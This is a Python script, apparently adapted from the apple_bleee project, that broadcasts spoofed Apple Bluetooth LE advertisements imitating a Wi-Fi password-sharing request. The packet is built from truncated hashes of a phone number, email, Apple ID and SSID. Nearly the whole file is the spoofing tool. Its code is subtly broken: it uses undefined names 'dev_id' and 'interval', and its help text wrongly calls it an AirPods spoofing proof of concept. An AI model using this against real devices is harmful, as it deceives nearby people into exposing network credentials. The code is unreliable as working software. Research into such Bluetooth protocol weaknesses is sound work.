# Adapting script from https://github.com/hexway/apple_bleee
# Thanks to Dmitry Chastuhin @_chipik and https://hexway.io 
# Author: @lucferbux
import random
import hashlib
import argparse
from time import sleep
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)


class AdvWifi():

    def __init__(self, args=None, interval=200, ble_iface=0, phone='none', email='none', appleid='none', ssid=None):
        if args:
            self.interval = args.interval
            self.ble_iface = args.ble_iface
            self.phone = args.phone
            self.email = args.email
            self.appleid = args.appleid
            self.ssid = args.ssid
        else:
            self.interval = interval
            self.ble_iface = ble_iface
            self.phone = phone
            self.email = email
            self.appleid = appleid
            self.ssid = ssid


    def advertisment(self):
        """Creates the wifi advertisement with the given ssid, and phone or email
        """
        if(not self.ssid):
            print("Error, must provide ssid")
            return

        toggle_device(self.ble_iface, True)

        header = (0x02, 0x01, 0x1a, 0x1a, 0xff, 0x4c, 0x00)
        const1 = (0x0f, 0x11, 0xc0, 0x08)
        id1 = (0xff, 0xff, 0xff)
        contact_id_mail = self.get_hash(self.email)
        contact_id_tel = self.get_hash(self.phone)
        contact_id_appleid = self.get_hash(self.appleid)
        id_wifi = self.get_hash(self.ssid)
        const2 = (0x10, 0x02, 0x0b, 0x0c,)
        try:
            sock = bluez.hci_open_dev(dev_id)
        except:
            print(f"Cannot open bluetooth device {self.ble_iface}")
            return

        try:
            print("Start advertising press ctrl + c to quit...")
            start_le_advertising(sock, adv_type=0x00, min_interval=interval, max_interval=interval, data=(
                        header + const1 + id1 + contact_id_appleid + contact_id_tel + contact_id_mail + id_wifi + const2))
            while True:
                sleep(2)    
        except:
            stop_le_advertising(sock)
            print()
            print("Bye")

    def get_hash(self, data, size=3):
        """Get hash of the given data
        
        Args:
            data (string): Data to convert
            size (int, optional): Size of the portion of the hash obtained. Defaults to 3.
        
        Returns:
            byte: Hash obtained
        """
        return tuple(bytearray.fromhex(hashlib.sha256(data.encode('utf-8')).hexdigest())[:size])

def create_parser():
    help_desc = '''
    AirPods advertise spoofing PoC
    ---chipik
    '''
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
    parser.add_argument('-b', '--ble_iface', default=0, type=int, help='Bluetooth inteface')
    parser.add_argument('-p', '--phone', default='none', help='Phone number (example: 39217XXX514')
    parser.add_argument('-e', '--email', default='none', help='Email address (example: test@test.com)')
    parser.add_argument('-a', '--appleid', default='none', help='AppleID')
    parser.add_argument('-s', '--ssid', required=True, help='WiFi SSID (example: test)')
    return parser.parse_args()

if __name__ == "__main__":
    args = create_parser()
    wifi = AdvWifi(args)
    wifi.advertisment()